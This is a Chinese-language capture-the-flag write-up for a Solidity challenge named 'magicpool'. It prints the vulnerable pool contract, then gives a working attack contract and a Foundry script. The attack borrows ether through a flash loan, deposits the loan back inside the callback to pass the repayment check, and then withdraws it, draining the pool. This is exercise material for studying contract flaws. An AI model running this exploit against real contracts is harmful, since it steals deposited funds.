# magicpool

# 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface FlashLoanReceiver {
    function execute() external payable;
}

//0xf1584EC53E6F51Ceb45b3b58983D2Ad8F6D00e43
contract Setup {
    MagicPool public target;

    constructor() payable {
        target = new MagicPool();
        target.deposit{value: 10 ether}();
    }

    function isSolved() external view returns (bool) {
        return (target.totalSupply() == 10 ether && //
            address(target).balance < 1 ether); //要求消耗合约balance到1ether以下
    }

    receive() external payable {}
}

//0x1D554738aCeFe0388E3Bf09815CCd89858525cC9
contract MagicPool {
    mapping(address => uint256) private balances; //0
    mapping(address => mapping(address => uint256)) public allowances; //1
    uint256 public totalSupply; //2
    uint256 public maxloanamount = 10 ether; //3

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event FlashLoanExecuted(address indexed borrower, uint256 amount);
    event Received(address indexed sender, uint256 amount);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );
    event Transfer(address indexed from, address indexed to, uint256 amount);

    function deposit() external payable {
        //存钱,已经存了10ether
        require(msg.value > 0, "Zero deposit");
        balances[msg.sender] += msg.value;
        totalSupply += msg.value; //totalSupply==10ether
        emit Deposited(msg.sender, msg.value);
    }

    function withdraw() external {
        //取钱
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");
        balances[msg.sender] = 0;
        totalSupply -= amount;
        payable(msg.sender).transfer(amount); //直转给msg.sender
        emit Withdrawn(msg.sender, amount);
    }

    function approve(address spender, uint256 amount) external {
        //授权spender转账额度amount
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
    }

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256) {
        return allowances[owner][spender];
    }

    function transferFrom(address owner, address to, uint256 amount) external {
        require(allowances[owner][msg.sender] >= amount, "Not allowed");
        require(balances[owner] >= amount, "Insufficient balance");

        allowances[owner][msg.sender] -= amount; //额度-amount
        balances[owner] -= amount; //owner减amount 银行
        balances[to] += amount; //to加amount 攻击合约

        emit Transfer(owner, to, amount);
    }

    function balanceOf(address user) external view returns (uint256) {
        return balances[user];
    }

    function getPoolBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function flashLoan(uint256 amount) external {
        require(amount <= maxloanamount, "Amount too high");
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough balance");

        FlashLoanReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "No money back");
        emit FlashLoanExecuted(msg.sender, amount);
    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}

```

首先注意到这个接口有个`execute()`函数要我们自己写，那很好了，可以利用这个来骗一骗

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {MagicPool} from "./1.sol";

contract Attack {
    MagicPool public magicpool;

    constructor(address payable addr) {
        magicpool = MagicPool(payable(addr));
    }

    function attack() external payable {
        magicpool.flashLoan(10 ether); //闪电贷
        magicpool.withdraw(); //取钱
    }

    function execute() external payable {
        magicpool.deposit{value: 10 ether}(); //存钱,这样既能通过还款检查,又能真的存进钱
    }

    receive() external payable {} //别忘记写收款函数
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";
import {MagicPool} from "../src/1.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(
            payable(0x1D554738aCeFe0388E3Bf09815CCd89858525cC9)
        );
        attack.attack(); //掏空目标合约
        require(
            address(0x1D554738aCeFe0388E3Bf09815CCd89858525cC9).balance <
                1 ether,
            "too rich"
        );
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-09-12 11:06:42  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ely0xgrhm0f9x9yd>